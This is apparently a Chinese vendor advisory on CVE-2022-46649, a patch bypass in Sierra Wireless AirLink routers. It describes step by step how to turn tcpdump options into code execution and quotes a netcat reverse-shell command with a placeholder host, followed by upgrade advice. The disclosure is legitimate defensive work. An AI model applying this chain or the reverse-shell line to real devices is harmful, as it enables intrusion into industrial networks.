> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XeKNzYTArLMvqEeceAZ6Bw)

**![](https://mmbiz.qpic.cn/mmbiz_gif/ll2PVky3MmaYz8UWHicLDSC4e3NqcibOLicCiaYtmQm9A0Ied3OLs4Wibj6bLz8jmf0gB3k0h1aQNNVKNqjKFcZV0Mg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)**
----------------------------------------------------------------------------------------------------------------------------------------------------------------------

Sierra Wireless AirLink 系列无线路由器和调制解调器为客户提供适用于各种工业、企业和车载应用的解决方案。具有有效 ACEManager 凭据和 ACEManager 界面访问权限的用户可以在设备上执行任意 Shell 命令。

Part1

漏洞状态

<table interlaced="enabled" data-sort="sortDisabled"><tbody><tr><td valign="top" align="center" width="69.66666666666667">漏洞细节<br></td><td valign="top" align="center" width="71.66666666666667">漏洞 POC<br></td><td valign="top" align="center" width="61.66666666666667">漏洞 EXP<br></td><td valign="top" align="center" width="65.66666666666667">在野利用<br></td></tr><tr><td valign="top" align="center" width="10">有</td><td valign="top" align="center" width="71.66666666666667">无</td><td valign="top" align="center" width="61.66666666666667">无</td><td valign="top" align="center" width="65.66666666666667">无</td></tr></tbody></table>

Part2

漏洞描述

<table interlaced="enabled"><tbody><tr><td valign="middle" align="center" width="93.66666666666667">‍漏洞名称<br></td><td valign="middle" align="left" width="383"><p>&nbsp;&nbsp;Sierra Wireless AirLink 参数注入漏洞</p></td></tr><tr><td valign="middle" align="center" width="93.66666666666667">CVE 编号</td><td valign="top" width="383">CVE-2022-46649</td></tr><tr><td valign="middle" align="center" width="93.66666666666667">漏洞类型</td><td valign="top" width="383">远程代码执行</td></tr><tr><td valign="middle" align="center" colspan="1" rowspan="1" width="93.66666666666667">漏洞等级</td><td valign="middle" align="left" colspan="1" rowspan="1" width="383">8.0 高危（High）</td></tr><tr><td valign="middle" align="center" colspan="1" rowspan="1" width="93.66666666666667">公开状态</td><td valign="middle" align="left" colspan="1" rowspan="1" width="383">公开<br></td></tr><tr><td valign="middle" align="center" colspan="1" rowspan="1" width="93.66666666666667">漏洞描述<br></td><td valign="middle" align="left" colspan="1" rowspan="1" width="383"><p>获取特定权限的用户可以通过操纵 IP 日志记录在设备上执行任意命令</p></td></tr><tr><td valign="middle" align="center" colspan="1" rowspan="1">时间线</td><td valign="bottom" align="left" colspan="1" rowspan="1">2023 年 1 月 28 日 公告发布</td></tr><tr><td valign="middle" align="center" colspan="1" rowspan="1">受影响版本<br></td><td valign="middle" align="left" colspan="1" rowspan="1"><p>ES450、GX450：V4.9.7 及更早版本</p>MP70、RV50、RV50x、RV55、LX 40、LX60：V4.16.0 之前的版本</td></tr></tbody></table>

Part3

漏洞分析

攻击者可以通过利用 ACEManager Web 服务对 /cgi-bin/iplogging.cgi 请求中的 “-z” 命令（负责向 cpdump 提供 postrotate-command）不正确地处理进行命令注入。这个漏洞被编号为 CVE-2018-4061，CVE-2022-46649 则是基于此漏洞补丁的绕过。

CVE-2018-4061 漏洞补丁对参数的过滤逻辑为删除任何 “-z” 参数后包括空格、制表符、换页符、垂直制表符的命令，如：“tcpdump -z reboot”。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5ia1WuUg7zqZhPj2fMZaPGkoxmXCicagof6AMTHrkTRATxaxuoaTmwhiaA/640?wx_fmt=jpeg)

对此可以进行绕过，只需使用没有任何间距的命令。如：“tcpdump -zreboot”，发送以下 POST 请求可以重启设备：

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5YQWiadFfwSEXaK41esBK2jg3AsJXO86zAKCBJ8FiaElrsV4TLia7JBiaug/640?wx_fmt=jpeg)

但以上操作只能执行有限的命令，可以继续通过利用 “-z” 参数来反弹 Shell。

通过检查 tcpdump 源代码，发现其使用 “execlp(any_binary, filename)” 执行 -z binary 命令。在本例中，文件名被硬编码为“/tmp/iplogging.pcap”，这就意味着在攻击中仅能利用目标设备已存在的文件。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5tDkIj9pgzW7lVT5KDVichoB38MTftd7OR7ic6MH95IsnyaGuq0M8AF2Q/640?wx_fmt=jpeg)

为了绕过这种限制，可以将恶意数据写入 / tmp/iplogging.pcap，使该文件既是有效的 PCAP 文件，也同样使是一个 Shell 脚本，同时可以将 sh 作为 postrotate-command。通过将恶意数据直接传输到适当的接口，可以直接插入到目标 PCAP 文件中，但可能会受其他通信的影响，因此另一种解决方案是使用 “/cgi-bin/iplogging_upload.cgi” 请求。

恶意 PCAP 文件必须满足以下要求：

① 通过 tcpdump 的验证；

② 是一个有效的 Shell 脚本；

③ 能够触发 tcpdump 的循环逻辑（文件大小超过 1MB）。

使用 “iplogging_upload.cgi” 上传恶意 PCAP 文件，该文件将保存到固定路径：“/tmp/iplogging_params.tcp”。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5SLzjg7iagckYztkeXb0B8vgnvoYSNQwV8OO72xHTEuLXmunC9IqFujg/640?wx_fmt=jpeg)

请求 “iplogging.cgi” 页面，执行带有以下参数的 tcpdump 命令：

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5Z0kr0EGtOD0A7Bx032tJ1XicegLl9iaTywf5BibfU9Lrg1icnrDCmDwkxQ/640?wx_fmt=jpeg)

“-r /tmp/iplogging_params.tcp”：指定 tcpdump 从成功上传的恶意 PCAP 文件中流量。

“-zsh”：将 “post rotate command” 设置为 sh 命令。当 tcpdump 轮换 PCAP 输出文件时，将执行 sh 命令。

“-C 1”：文件大小超过 1MB 时，轮换输出文件。

请求发出之后，tcpdump 将读取恶意 PCAP 文件 “/tmp/iplogging_params.tcp” 并将其写入预定义的输出文件“/tmp/iplogging.pcap”。一旦其数据达到 1MB，tcpdump 将通过 - z 参数对 iplogging.pcap 文件执行 sh 命令。此时，构造的“nohup nc {ip} {port} -e /bin/sh &”已被写入 iplogging.pcap，/bin/sh 将逐行读取文件，将 PCAP 文件头作为 “坏行” 进行忽略，进而执行反弹 Shell 命令。

成功反弹 Shell。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmaSkTwJFTFPxvRwrPVzsbib5YyBWLfWhwR3dvuVe4zPIicib8N4icWOH7DRHHxR2WX1ecS4sMibhZ4eB3Q/640?wx_fmt=jpeg)

Part4

缓解建议

*   将 MP70、RV50、RV50x、RV55、LX 40、LX60 升级至 ALEOS 4.16.0 或更高版本。
    
*   将 ES450、GX450 升级到 ALEOS 4.9.8（如果可用）或更高版本 。
    

 **![](https://mmbiz.qpic.cn/mmbiz_png/ll2PVky3MmaolAkPsicNuzDOok8n4xXZIczeyb9icH1wWwdibvVxEQqY0znTbqgES8yD0bHynSX6ADlHCoBrYtqaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)** **获取更多情报**

  

联系我们，获取更多漏洞情报详情及处置建议，让企业远离漏洞威胁。  
电话：18511745601

邮箱：shiliangang@andisec.com

**漏洞分析回顾**  
![](https://mmbiz.qpic.cn/mmbiz_gif/ll2PVky3MmYrt8sZBqiah8aNInQspzccnPAAhd0OKLQ5Ziad4ovQEohiamyrpYjQcwVAWROpYWmMXia1YRKPiczFSQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)[![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmYxbjV5s1pCib07qElZcibcBvXTQKzK8LKV0CL2jeP4xZcic9W99VpTnoSzypbsBQoAVpsbCBttKVQ1g/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU3ODQ4NjA3Mg==&mid=2247538810&idx=1&sn=4a17b16910d4b93028d1a081b2b4bb08&chksm=fd76b22dca013b3b3525659c8efaf2e0e4ee9bf7df8c2c6d672de464574799676476572d0e36&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmYxbjV5s1pCib07qElZcibcBv2Mb8RWtkSEficZtkGskZ4ib3qxWC7o4exGopuDuNppUBCwiaHwhoLKCHg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU3ODQ4NjA3Mg==&mid=2247538512&idx=1&sn=ebce89116c4aab35880701782de25424&chksm=fd76bd07ca013411260c2b55e0a5407d0faeee77956c2ce0decc67e45e0b0683d0bb2b8ba399&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmYxbjV5s1pCib07qElZcibcBvbaOpHicBUbYI0HC1SCbl9R5wjxzC8VEQb7OeyEm549bqM5Yj2WRYxuw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU3ODQ4NjA3Mg==&mid=2247537202&idx=1&sn=7e521deb553e2862cb7a237c3aa42747&chksm=fd76b865ca013173985c91e640ec5acb7f72178e4e6bc0bf8a311df8eb58da67b1f9f59758c2&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/ll2PVky3MmYxbjV5s1pCib07qElZcibcBvLialhnNBuCjUW9bNiaNfSFUn0GMUxtcicotKqoRtK5ibZUXLsrH6icrAbYg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU3ODQ4NjA3Mg==&mid=2247534557&idx=1&sn=6b7a8f383e7d1e055a57cce3d44209c5&chksm=fd76ad8aca01249c30b3692b8e8cb5173f4939762c0b95753c94c16fee19b0783508ddf66399&scene=21#wechat_redirect)

  

北京安帝科技有限公司是新兴的工业网络安全能力供应商，专注于网络化、数字化、智能化背景下的工业网络安全技术、产品、服务的创新研究和实践探索，基于网络空间行为学理论及工业网络系统安全工程方法，围绕工业网络控制系统构建预防、识别、检测、保护、响应、恢复等核心能力优势，为电力、水利、石油石化、轨道交通、烟草、钢铁冶金、智能制造、矿业等关键信息基础设施行业提供安全产品、服务和综合解决方案。坚持 IT 安全与 OT 安全融合发展，坚持产品体系的自主可控，全面赋能客户构建 “业务应用紧耦合、用户行为强相关、安全风险自适应、网络弹性稳增强” 的主动防御和纵深防御相结合的安全保障体系。截至 2021 年底，公司主要产品已应用于数千家 “关基” 企业，其中工业网络安全态势感知平台已部署 4000 余家客户，虚实结合工业网络靶场服务超过 50 家客户。

![](https://mmbiz.qpic.cn/mmbiz_gif/ll2PVky3Mma4ibTfp7sC3ibt8WmetoDfiaGHEb7VOiaemeFbuCTupYgus7NTKkibwKwpsEDfzqZdXh1skHff6A6VNgA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**点击 “在看” 鼓励一下吧**

**![](https://mmbiz.qpic.cn/mmbiz_png/ll2PVky3MmZOFFgf4oTyfUTx7y0ZBV9yIg8qmaSwAvbjiba2KQn7VgmXYIriagc9H0hMu1u0UIZr98JYSmyG9tibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)**